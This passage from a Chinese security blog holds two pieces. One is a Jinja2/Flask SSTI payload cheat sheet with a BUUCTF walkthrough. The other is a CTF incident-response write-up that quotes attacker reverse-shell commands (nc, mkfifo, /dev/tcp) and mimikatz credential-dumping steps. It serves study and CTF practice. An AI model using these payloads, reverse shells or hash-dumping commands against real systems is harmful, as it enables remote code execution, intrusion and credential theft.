nja2.runtime.BlockReference</td><td>jinja2.runtime</td></tr><tr><td>jinja2.runtime.LoopContext</td><td>jinja2.runtime</td></tr><tr><td>jinja2.runtime.Macro</td><td>jinja2.runtime</td></tr><tr><td>jinja2.runtime.Undefined</td><td>jinja2.runtime</td></tr><tr><td>jinja2.environment.Environment</td><td>jinja2.environment</td></tr><tr><td>jinja2.environment.TemplateExpression</td><td>jinja2.environment</td></tr><tr><td>jinja2.environment.TemplateStream</td><td>jinja2.environment</td></tr><tr><td>dis.Bytecode</td><td>dis</td></tr></tbody></table><ul><li>如何查找类的位置？</li></ul><p>将网页的内容copy到notepad上然后将<code>,</code>替换为<code>\n</code>（扩展），然后查找对应类名，并查看其左侧序列，记得左边的序列要-1，因为数组从0开始计数</p><h2 id="常见payload分析"><a href="#常见payload分析" class="headerlink" title="常见payload分析"></a>常见payload分析</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">{{[].__class__.__base__.__subclasses__()}}</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func__globals.values()[13]['eval']('__import__("os").popen("ls").read()')</span><br><span class="line"></span><br><span class="line">__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')</span><br><span class="line"></span><br><span class="line">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings'</span><br><span class="line">%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('&lt;command&gt;').read()") }}{% endif %}{% endfor %}</span><br><span class="line"></span><br><span class="line">".__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1').read()</span><br></pre></td></tr></tbody></table></figure><h2 id="通用payload"><a href="#通用payload" class="headerlink" title="通用payload"></a>通用payload</h2><p>lipsum是jinja2的内置全局变量，jinja2一共有3个内置的全局函数：range、lipsum、dict,其中只有lipsum有__globals__键，其他两个要逃肯定逃得出来，但是payload构造就要花点功夫了。除此之外，flask也提供了两个内置的全局函数：url_for、getflashed_messages，两个都有__globals__键</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{lipsum.__globals__.get('os').popen("cat flag2.txt").read()}}</span><br></pre></td></tr></tbody></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、过滤了''  --&gt;  使用" "</span><br><span class="line">2、过滤了_   --&gt;  使用\x5f//十六机制</span><br><span class="line">3、过滤了.   --&gt;  使用[]</span><br><span class="line">原本为''.__class__.__base__    --&gt;   ()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]</span><br><span class="line"></span><br><span class="line">{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("nl app*")["read"]()}}</span><br></pre></td></tr></tbody></table></figure><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>题目：BUUCTF-[Flask]SSTI 1</p><p>1、打开</p><p><img src="https://pic1.imgdb.cn/item/68453cfa58cb8da5c83a0f04.png"></p><p>2、FUZZ出参数为name</p><p>3、发现存在ssti注入</p><img src="https://pic1.imgdb.cn/item/68453d3558cb8da5c83a0f1e.png" style="zoom:67%;"><p>4、构造payload</p><p>此处的<code>''</code>是表示任意的字符串类型，也可以使用<code>()</code>（元组）、<code>[]</code>（列表）、<code>{}</code>（字典）</p><ul><li><code>''</code> 是一个 <strong>Python 空字符串对象</strong>，属于 <code>str</code> 类。</li><li>在模板引擎（如 Jinja2）中，它被用作<strong>链式属性访问的起点</strong>，目的是通过<strong>字符串对象</strong>的继承关系访问危险方法或类（如 <code>os</code>、<code>subprocess</code>）。</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先获取类:</span><br><span class="line">{{''.__class__}}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68469bfb58cb8da5c83dbcb6.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取基类:</span><br><span class="line">{{''.__class__.__bases__}}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68469c2a58cb8da5c83dbdb0.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取基类的所有子类:</span><br><span class="line">{{''.__class__.__base__.__subclasses__()}}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68469c6758cb8da5c83dbf64.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在子类中找到存在eval函数的类，此处找到catch_warnings这个类，位于第167个类，但是下标从0开始就是166</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[166]}}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>附上一个脚本，查找是第几个类：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">233</span>)):</span><br><span class="line">    url = <span class="string">'http://node5.buuoj.cn:26198/?name={{"".__class__.__base__.__subclasses__()['</span>+<span class="built_in">str</span>(i)+<span class="string">']}}'</span></span><br><span class="line">    r= requests.get(url=url).text</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'warnings.catch_warnings'</span> <span class="keyword">in</span> r):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure></blockquote><p><img src="https://pic1.imgdb.cn/item/68469c9858cb8da5c83dc0c5.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在这个类中，看他是否被重载了，如果没有出现wrapper字眼，说明已经重载了，可以使用。然后查看全部全局变量，看看这里面有没有危险方法函数eval、popen等:</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[166].__init__.__globals__}}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68469cdd58cb8da5c83dc2b8.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过找{，{的前面就是键，对应的值中存在eval函数：['__builtins__']['eval']</span><br><span class="line">__builtins__：提供对Python的所有“内置”标识符的直接访问</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68469d8e58cb8da5c83dc7c3.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码执行：eval('__import__("os").popen("env").read()')</span><br><span class="line">eval()：计算字符串表达式的值</span><br><span class="line">popen()：执行一个shell以运行命令来开启一个进程</span><br><span class="line"></span><br><span class="line">{{''.__class__.__base__.__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("env").read()')}}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/68469e4d58cb8da5c83dcfb0.png"></p><p>另一种方式：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找os._wrap_close类，其中的popen函数</span><br><span class="line">{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("env").read()}}</span><br></pre></td></tr></tbody></table></figure><p>官方payload：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("env").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第二届Parloo杯应急响应</title>
      <link href="/2025/06/03/di-er-jie-parloo-bei-ying-ji-xiang-ying/"/>
      <url>/2025/06/03/di-er-jie-parloo-bei-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<h1 id="第二届Parloo杯应急响应"><a href="#第二届Parloo杯应急响应" class="headerlink" title="第二届Parloo杯应急响应"></a>第二届Parloo杯应急响应</h1><p>该文章仅为个人复现学习</p><p>参考文章：</p><p><a href="https://ta0.fun/posts/28af606d/">第二届帕鲁杯应急响应wp | ta0的小站</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0NDYwOTcxNg==&amp;mid=2247486015&amp;idx=1&amp;underline_after_modify=0&amp;sn=089c9a0f69e19b762441f751a5775dbc&amp;item_show_type=0&amp;share_id=1749018391066&amp;fromsharesource=underline&amp;contentMd5=0a12a8ab596f6b8d2c5c46a2c19db19d&amp;start=426&amp;end=468&amp;forbidShowSource=0#wechat_redirect">【取证】第二届帕鲁”Parloo”杯-应急响应之畸形的爱</a></p><h2 id="1-畸形的爱"><a href="#1-畸形的爱" class="headerlink" title="1 畸形的爱"></a>1 畸形的爱</h2><p><strong>网络架构</strong></p><img src="https://pic1.imgdb.cn/item/683f145258cb8da5c8295a3e.png" style="zoom: 67%;"><h3 id="应急响应1-1（攻击者IP）"><a href="#应急响应1-1（攻击者IP）" class="headerlink" title="应急响应1-1（攻击者IP）"></a>应急响应1-1（攻击者IP）</h3><blockquote><p>题目描述：提交攻击者使用的攻击ip地址1  </p></blockquote><p>1、查看webserver中nginx访问日志access.log文件（/var/log/nginx/access.log），看到a.php的操作，其攻击ip即为flag</p><p><img src="https://pic1.imgdb.cn/item/683f14c558cb8da5c8295a70.png" alt="img"> </p><p><strong>所以 攻击者的IP为192.168.31.240</strong></p><h3 id="应急响应1-2（攻击者IP）"><a href="#应急响应1-2（攻击者IP）" class="headerlink" title="应急响应1-2（攻击者IP）"></a>应急响应1-2（攻击者IP）</h3><blockquote><p>题目描述：提交攻击者使用的攻击ip地址2</p></blockquote><p>1、进入/var/lib/docker中查找flag的文件名</p><p><img src="https://pic1.imgdb.cn/item/683f17e758cb8da5c8299adb.png"></p><p>2、逐一查看，在4bc4b开头的镜像中的/var/www/html文件夹中看到一个clean.sh</p><p><img src="https://pic1.imgdb.cn/item/683f193358cb8da5c829bcbd.png"></p><p><code>/var/lib/docker/overlay2</code> 包含以下关键内容：</p><ul><li><strong>每个镜像/容器层</strong>对应一个随机命名的子目录（如 <code>l</code> 开头的短 ID）。</li><li><strong>各层目录</strong>包含：<ul><li><code>diff/</code>：实际文件内容（如镜像层文件或容器修改的文件）。</li><li><code>link</code>：短标识符文件。</li><li><code>lower</code>：描述该层的下层依赖（组成联合挂载的层级关系）。</li><li><code>merged/</code>：挂载后的统一视图（仅容器运行时存在）。</li></ul></li></ul><p>3、打开clean.sh查看，如下图</p><p><img src="https://pic1.imgdb.cn/item/683f1d5c58cb8da5c829be81.png"></p><p>这段代码是 <strong>Linux/Unix 系统下的几种反弹 Shell（Reverse Shell）攻击命令</strong>，通常用于在受害机器上建立远程控制连接。攻击者通过这些命令可以让目标机器主动连接攻击者的服务器，从而获取 Shell 权限。</p><p>（1）第一种方式：使用 <code>mkfifo</code> + <code>nc</code> 反弹 Shell</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'OK'; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc 192.168.31.11 1133 &gt;/tmp/f</span><br></pre></td></tr></tbody></table></figure><ul><li>**<code>mkfifo /tmp/f</code>**：创建一个命名管道（FIFO 文件 <code>/tmp/f</code>）。</li><li>**<code>cat /tmp/f | sh -i 2&gt;&amp;1</code>**：从管道读取数据并交给 <code>sh</code> 执行，同时将错误输出重定向到标准输出。</li><li>**<code>nc 192.168.31.11 1133 &gt; /tmp/f</code>**：使用 <code>nc</code> 连接到攻击者的 IP <code>192.168.31.11</code> 端口 <code>1133</code>，并将接收到的命令写入 <code>/tmp/f</code>。</li><li><strong>整体作用</strong>：建立一个交互式 Shell 通道，攻击者可以在自己的机器上输入命令，目标机器会执行并返回结果。</li></ul><p>（2）第二种方式：直接使用 <code>nc -c</code> 反弹 Shell</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c sh 192.168.31.11 1133</span><br></pre></td></tr></tbody></table></figure><ul><li>**<code>nc -c sh</code>**：某些版本的 <code>nc</code>（如 <code>ncat</code> 或 <code>netcat-traditional</code>）支持 <code>-c</code> 参数，直接执行 <code>/bin/sh</code> 并连接远程主机。</li><li><strong>作用</strong>：直接向 <code>192.168.31.11:1133</code> 发送 Shell，攻击者可以执行任意命令。</li></ul><p>（3）第三种方式：使用 <code>/dev/tcp</code> 反弹 Shell（无需 <code>nc</code>）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.31.11/1133 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure><ul><li>**<code>/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;</code>**：Linux 内置的 TCP 虚拟设备，可以直接建立 Socket 连接（不需要 <code>nc</code>）。</li><li>**<code>sh -i</code>**：启动交互式 Shell。</li><li>**<code>&gt;&amp;</code> 和 <code>0&gt;&amp;1</code>**：将标准输出、错误输出和标准输入全部重定向到 TCP 连接。</li><li><strong>作用</strong>：直接通过 <code>/dev/tcp</code> 建立反向 Shell，攻击者可以完全控制目标机器。</li></ul><p><strong>所以 攻击ip地址为192.168.31.11</strong></p><h3 id="应急响应1-3（暴力破解时间）"><a href="#应急响应1-3（暴力破解时间）" class="headerlink" title="应急响应1-3（暴力破解时间）"></a>应急响应1-3（暴力破解时间）</h3><blockquote><p> 题目描述：题解攻击者暴力破解开始时间。</p></blockquote><p>1、在history历史命令中看到一个docker start的命令，这是一个启动docker容器的命令</p><p><img src="https://pic1.imgdb.cn/item/683f223058cb8da5c829c0a5.png"></p><p>2、使用docker ps -a查看全部开启过的容器</p><p><img src="https://pic1.imgdb.cn/item/683f23c358cb8da5c829c110.png"></p><p>3、找相对于现在更久的容器，并且phpmyadmin是最容易被暴力破解的，所以从这个68014开头的容器开动，docker start开启容器，然后使用<code>docker exec -it</code>进入容器的交互式终端</p><p><img src="https://pic1.imgdb.cn/item/683f25ce58cb8da5c829c19a.png"></p><p>4、此处发现日志被docker重定向输出了</p><p><img src="https://pic1.imgdb.cn/item/683f272658cb8da5c829c1db.png"></p><ul><li>**<code>access.log -&gt; /dev/stdout</code>**：<ul><li><code>access.log</code> 并不存储真实数据，而是<strong>直接输出到标准输出（stdout）</strong>。</li><li>通常用于 <strong>Docker 容器</strong> 或 <strong>日志重定向</strong> 场景，日志会直接显示在终端或由日志收集器（如 <code>docker logs</code>、<code>journald</code>）捕获。</li></ul></li></ul><p>由于 <code>access.log</code> 指向 <code>/dev/stdout</code>，它不会存储数据在磁盘上，而是实时输出到标准输出。</p><p>查看方法：如果运行在 Docker 容器中，需要使用docker logs来查看，</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名或ID&gt;  # 查看容器的标准输出（即 access.log）</span><br></pre></td></tr></tbody></table></figure><p>5、使用docker logs查看日志，首先，phpmyadmin登陆界面是POST方式提交信息，重点留意POST数据包，并且登录界面为index.php。爆破的过的小伙伴应该都知道根据爆破值的长短，大部分的响应包的长度也是类似的，就如图中6340、6339、6338，响应包大小差不多，所以可以判断在进行爆破。</p><p><img src="https://pic1.imgdb.cn/item/683f299858cb8da5c829c29f.png"></p><p><strong>所以 可以确定爆破时间为2025:03:05:58</strong></p><h4 id="docker命令回顾"><a href="#docker命令回顾" class="headerlink" title="docker命令回顾"></a>docker命令回顾</h4><table><thead><tr><th align="center"><strong>命令</strong></th><th align="center"><strong>功能</strong></th><th align="center"><strong>示例</strong></th></tr></thead><tbody><tr><td align="center"><code>docker run</code></td><td align="center">启动一个新的容器并运行命令</td><td align="center"><code>docker run -d ubuntu</code></td></tr><tr><td align="center"><code>docker ps</code></td><td align="center">列出当前正在运行的容器</td><td align="center"><code>docker ps</code></td></tr><tr><td align="center"><code>docker ps -a</code></td><td align="center">列出所有容器（包括已停止的容器）</td><td align="center"><code>docker ps -a</code></td></tr><tr><td align="center"><code>docker build</code></td><td align="center">使用 Dockerfile 构建镜像</td><td align="center"><code>docker build -t my-image .</code></td></tr><tr><td align="center"><code>docker images</code></td><td align="center">列出本地存储的所有镜像</td><td align="center"><code>docker images</code></td></tr><tr><td align="center"><code>docker pull</code></td><td align="center">从 Docker 仓库拉取镜像</td><td align="center"><code>docker pull ubuntu</code></td></tr><tr><td align="center"><code>docker push</code></td><td align="center">将镜像推送到 Docker 仓库</td><td align="center"><code>docker push my-image</code></td></tr><tr><td align="center"><code>docker exec</code></td><td align="center">在运行的容器中执行命令</td><td align="center"><code>docker exec -it container_name bash</code></td></tr><tr><td align="center"><code>docker stop</code></td><td align="center">停止一个或多个容器</td><td align="center"><code>docker stop container_name</code></td></tr><tr><td align="center"><code>docker start</code></td><td align="center">启动已停止的容器</td><td align="center"><code>docker start container_name</code></td></tr><tr><td align="center"><code>docker restart</code></td><td align="center">重启一个容器</td><td align="center"><code>docker restart container_name</code></td></tr><tr><td align="center"><code>docker rm</code></td><td align="center">删除一个或多个容器</td><td align="center"><code>docker rm container_name</code></td></tr><tr><td align="center"><code>docker rmi</code></td><td align="center">删除一个或多个镜像</td><td align="center"><code>docker rmi my-image</code></td></tr><tr><td align="center"><code>docker logs</code></td><td align="center">查看容器的日志</td><td align="center"><code>docker logs container_name</code></td></tr><tr><td align="center"><code>docker inspect</code></td><td align="center">获取容器或镜像的详细信息</td><td align="center"><code>docker inspect container_name</code></td></tr><tr><td align="center"><code>docker exec -it</code></td><td align="center">进入容器的交互式终端</td><td align="center"><code>docker exec -it container_name /bin/bash</code></td></tr><tr><td align="center"><code>docker network ls</code></td><td align="center">列出所有 Docker 网络</td><td align="center"><code>docker network ls</code></td></tr><tr><td align="center"><code>docker volume ls</code></td><td align="center">列出所有 Docker 卷</td><td align="center"><code>docker volume ls</code></td></tr><tr><td align="center"><code>docker-compose up</code></td><td align="center">启动多容器应用（从 <code>docker-compose.yml</code> 文件）</td><td align="center"><code>docker-compose up</code></td></tr><tr><td align="center"><code>docker-compose down</code></td><td align="center">停止并删除由 <code>docker-compose</code> 启动的容器、网络等</td><td align="center"><code>docker-compose down</code></td></tr><tr><td align="center"><code>docker info</code></td><td align="center">显示 Docker 系统的详细信息</td><td align="center"><code>docker info</code></td></tr><tr><td align="center"><code>docker version</code></td><td align="center">显示 Docker 客户端和守护进程的版本信息</td><td align="center"><code>docker version</code></td></tr><tr><td align="center"><code>docker stats</code></td><td align="center">显示容器的实时资源使用情况</td><td align="center"><code>docker stats</code></td></tr><tr><td align="center"><code>docker login</code></td><td align="center">登录 Docker 仓库</td><td align="center"><code>docker login</code></td></tr><tr><td align="center"><code>docker logout</code></td><td align="center">登出 Docker 仓库</td><td align="center"><code>docker logout</code></td></tr></tbody></table><h3 id="应急响应1-4（留下flag）"><a href="#应急响应1-4（留下flag）" class="headerlink" title="应急响应1-4（留下flag）"></a>应急响应1-4（留下flag）</h3><blockquote><p>题目描述：提交攻击者留下的flag1  </p></blockquote><p>1、在win10PC2的机子的计划任务中找到flag1</p><p><img src="https://pic1.imgdb.cn/item/683f2c2058cb8da5c829c328.png"></p><p>还有一个方法，机子上有everything搜索工具，直接搜flag，找到flag1</p><p><img src="https://pic1.imgdb.cn/item/683f2ca058cb8da5c829c340.png"></p><h3 id="应急响应1-5（留下flag）"><a href="#应急响应1-5（留下flag）" class="headerlink" title="应急响应1-5（留下flag）"></a>应急响应1-5（留下flag）</h3><blockquote><p>题目描述：提交攻击者留下的flag2  </p></blockquote><p>1、在快速访问中有的最近访问文件中有个可以的a.bat文件，打开找到flag2</p><img src="https://pic1.imgdb.cn/item/683f2d5958cb8da5c829c371.png" style="zoom:67%;"><h3 id="应急响应1-6（留下flag）"><a href="#应急响应1-6（留下flag）" class="headerlink" title="应急响应1-6（留下flag）"></a>应急响应1-6（留下flag）</h3><blockquote><p>题目描述：提交攻击者留下的flag3  </p></blockquote><p>1、在webserver的www目录下index.php有数据库的连接密码</p><p><img src="https://pic1.imgdb.cn/item/683f2e8c58cb8da5c829c3ae.png"></p><p>2、打开sql数据库服务器，连接数据库，查看数据库内容，将order_content内容base64解码</p><p><img src="https://pic1.imgdb.cn/item/683f2ff558cb8da5c829c3f4.png"></p><p>3、第三条数据解出带有flag3的值</p><p><img src="https://pic1.imgdb.cn/item/683f30b158cb8da5c829c3fd.png"></p><h3 id="应急响应1-7（钓鱼文件哈希）"><a href="#应急响应1-7（钓鱼文件哈希）" class="headerlink" title="应急响应1-7（钓鱼文件哈希）"></a>应急响应1-7（钓鱼文件哈希）</h3><blockquote><p>题目描述：提交钓鱼文件的哈希32位大写</p></blockquote><p>1、在win10PC2机子的内网通的和王美欣的聊天记录中看到一个简历.exe文件，简历传一个可执行文件，怀疑是钓鱼文件。</p><p><img src="https://pic1.imgdb.cn/item/683f319058cb8da5c829c41f.png"></p><p>2、在回收站中找到这个被删除的钓鱼文件， 可以使用Windows系统自带工具certutil查看他的md5值，</p><h4 id="certutil命令（求md5值）"><a href="#certutil命令（求md5值）" class="headerlink" title="certutil命令（求md5值）"></a>certutil命令（求md5值）</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令格式为 **certutil -hashfile some_file MD5**</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/683f32a658cb8da5c829c443.png"></p><p>3、得到的md5值将字母都转化为大写，即得到flag</p><h3 id="应急响应1-8（webshell密码）"><a href="#应急响应1-8（webshell密码）" class="headerlink" title="应急响应1-8（webshell密码）"></a>应急响应1-8（webshell密码）</h3><blockquote><p>题目描述：提交攻击者留下的webshell-1密码  </p></blockquote><p>1、在webserver机子上，查看nginx的访问日志，搜索php文件后缀名，看到两个php文件，一个shell.php，一个a.php，这一题需要提交的flag是shell.php的密码，a.php的密码在第10题提交。</p><p><img src="https://pic1.imgdb.cn/item/683f34ba58cb8da5c829c47a.png"></p><p>2、使用find命令搜索shell.php文件，找到这个shell.php在docker容器中，读取shell.php的内容，看到密码为hack</p><p><img src="https://pic1.imgdb.cn/item/683f354558cb8da5c829c4a0.png"></p><h3 id="应急响应1-9（攻击者开放端口）"><a href="#应急响应1-9（攻击者开放端口）" class="headerlink" title="应急响应1-9（攻击者开放端口）"></a>应急响应1-9（攻击者开放端口）</h3><blockquote><p>题目描述：提交攻击者开放端口，格式为：palu{xxx,xxx,xxx}，有3个端口</p></blockquote><p>1、在webserver机子上，使用<code>crontab -l</code>查看计划任务，其中有一个反弹shell的命令，暴露了攻击者开放的1144端口</p><p><img src="https://pic1.imgdb.cn/item/683f37b158cb8da5c829c55a.jpg"></p><p>2、第3题中也存在反弹shell的指令，同时暴露了攻击者开放端口1133</p><p><img src="https://pic1.imgdb.cn/item/683f1d5c58cb8da5c829be81.png"></p><p>3、netstat查看网络连接状态，找到恶意外联IP的另一个端口8084</p><img src="https://pic1.imgdb.cn/item/683f3b0d58cb8da5c829c5e5.png" style="zoom:67%;"><p><strong>所以 三个攻击者开放的端口为1144，1133，8084</strong></p><h3 id="应急响应1-10（webshell密码）"><a href="#应急响应1-10（webshell密码）" class="headerlink" title="应急响应1-10（webshell密码）"></a>应急响应1-10（webshell密码）</h3><blockquote><p>题目描述：提交攻击者留下的webshell密码2  </p></blockquote><p>1、在webserver的html目录，查看a.php内容，其中包含webshell密码</p><p><img src="https://pic1.imgdb.cn/item/683f3c2758cb8da5c829c646.png"></p><h3 id="应急响应1-11（隐藏账户密码）"><a href="#应急响应1-11（隐藏账户密码）" class="headerlink" title="应急响应1-11（隐藏账户密码）"></a>应急响应1-11（隐藏账户密码）</h3><blockquote><p>题目描述：提交攻击者留下的隐藏账户的密码  </p></blockquote><p>1、在win10PC2机子上，将mimikatz工具传到机子上，然后使用命令抓取NTML哈希</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">   token::elevate</span><br><span class="line">        lsadump::sam</span><br></pre></td></tr></tbody></table></figure><p>（1）<code>privilege::debug</code></p><ul><li><strong>作用</strong>：启用 <code>SeDebugPrivilege</code> 权限（调试权限）。</li><li><strong>用途</strong>：<ul><li>该权限允许进程调试其他进程（包括系统进程），是 Mimikatz 提取内存中敏感信息（如密码哈希）的前提条件。</li><li>需要当前用户具有<strong>管理员权限</strong>才能成功启用（否则会报错）。</li></ul></li></ul><p>（2）<code>token::elevate</code></p><ul><li><strong>作用</strong>：将当前令牌（Token）提升至 <code>SYSTEM</code> 权限。</li><li><strong>用途</strong>：<ul><li>通过模拟 <code>NT AUTHORITY\SYSTEM</code>（系统最高权限账户），绕过权限限制，访问受保护的系统资源（如 SAM 数据库、LSASS 进程）。</li><li>常用于转储本地账户的密码哈希或操作服务配置。</li></ul></li></ul><p>（3）<code>lsadump::sam</code></p><ul><li><strong>作用</strong>：从本地 <strong>SAM（Security Account Manager）数据库</strong>中提取用户账户的密码哈希。</li><li><strong>提取的信息</strong>：<ul><li>本地用户的用户名、RID（相对标识符）。</li><li>LM/NTLM 哈希（用于横向移动或哈希传递攻击）。</li></ul></li><li><strong>依赖条件</strong>：<ul><li>需要 <code>SYSTEM</code> 权限（通过前两条命令提权后即可访问 SAM 的 <code>HKLM\SAM</code> 注册表项）。</li></ul></li></ul><ol><li><strong><code>privilege::debug</code></strong> → 获取调试权限。</li><li><strong><code>token::elevate</code></strong> → 提权至 <code>SYSTEM</code>。</li><li><strong><code>lsadump::sam</code></strong> → 导出本地用户哈希（可用于破解或横向渗透）。</li></ol><p>防御措施：</p><ul><li><strong>限制调试权限</strong>：通过组策略限制 <code>SeDebugPrivilege</code> 的分配。</li><li><strong>启用 Credential Guard</strong>（Windows 10+）：防止内存中凭证被读取。</li><li><strong>监控 Mimikatz 行为</strong>：检测进程对 LSASS 或 SAM 的异常访问。</li></ul><p>2、执行完上面三个指令后，获取到一个隐藏账户system$，以及他的NTML哈希值</p><p><img src="https://pic1.imgdb.cn/item/683fe96b58cb8da5c82b5eea.png"></p><p>3、将NTML哈希进行爆破，获取明文密码wmx_love</p><p><strong>所以  隐藏账户的密码为wmx_love</strong></p><h3 id="应急响应1-12（溯源攻击者邮箱）"><a href="#应急响应1-12（溯源攻击者邮箱）" class="headerlink" title="应急响应1-12（溯源攻击者邮箱）"></a>应急响应1-12（溯源攻击者邮箱）</h3><blockquote><p>题目描述：[溯源]攻击者的邮箱. </p></blockquote><p>1、这题要溯源攻击者的身份，我们从攻击者留下的钓鱼木马（简历.exe）来分析，用IDA打开查看shift+F12查看strings字符串，如下图，看到一个用户名n0k4u</p><p><img src="https://pic1.imgdb.cn/item/683ff99a58cb8da5c82be5c4.png"></p><p>2、去GitHub上找到该用户仓库</p><img src="https://pic1.imgdb.cn/item/683ffb3f58cb8da5c82be8df.png" style="zoom:50%;"><p>3、使用<a href="https://emailaddress.github.io/?user=n0k4u">https://emailaddress.github.io</a>这个工具可以获取GitHub上用户的邮箱</p><img src="https://pic1.imgdb.cn/item/683ffcde58cb8da5c82becb1.png" style="zoom: 67%;"><h3 id="应急响应1-13（溯源flag）"><a href="#应急响应1-13（溯源flag）" class="headerlink" title="应急响应1-13（溯源flag）"></a>应急响应1-13（溯源flag）</h3><blockquote><p>题目描述：提交溯源后得到的flag  </p></blockquote><p>1、在GitHub中找到一篇日记</p><img src="https://pic1.imgdb.cn/item/683ffb1758cb8da5c82be881.png" style="zoom: 50%;"><p>2、这个密语看着像qq号，加一下看看，得到flag</p><img src="https://pic1.imgdb.cn/item/683ffbf158cb8da5c82be9a3.jpg" style="zoom: 33%;"><h2 id="2-应急响应主线"><a href="#2-应急响应主线" class="headerlink" title="2 应急响应主线"></a>2 